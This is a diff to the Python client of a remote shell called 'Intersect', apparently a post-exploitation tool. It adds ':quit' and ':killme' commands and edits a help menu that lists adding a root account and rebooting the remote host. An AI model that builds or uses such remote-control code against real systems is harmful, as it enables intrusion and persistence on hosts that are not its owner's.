@@ -24,10 +24,6 @@ try:
     print("[+] New connection established!")
     print("[+] Starting Intersecting shell....")
     print("[+] Type ':help' for all commands.")
-    print("[+] Available Modules: ")
-    server.send(":mods")
-    data = server.recv(socksize)
-    print data
 except:
     print("[!] Connection error!")
     sys.exit(2)
@@ -39,7 +35,12 @@ while True:
     server.sendall(str(cmd))
 
     if cmd == (':killme'):
-        print("[!] Shutting down shell!")
+        print("[!] Shutting down Intersect!")
+        server.close()
+        sys.exit(0)
+
+    if cmd == (':quit'):
+        print("[!] Closing shell connection!")
         server.close()
         sys.exit(0)
 
@@ -63,8 +64,8 @@ while True:
         sendfile.close()
         server.sendall(filedata)
 
-    elif cmd == (":exec"):
-        print("Command not yet fully implemented!")
+    elif cmd.startswith(':exec'):
+        print("[!] Feature not yet implemented!")
 
     elif cmd == (":help"):
         print(" Available Commands: ")
@@ -76,7 +77,9 @@ while True:
         print(" :addroot <name>   | add new root account")
         print(" :reboot           | reboot remote host system")
         print(" :help             | display this menu")
-        print(" :killme           | shuts down shell serverection\n")
+        print(" :killme           | shuts down Intersect completely")
+        print(" :quit             | closes shell connection\n")
+        
         print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")
 
 server.close()
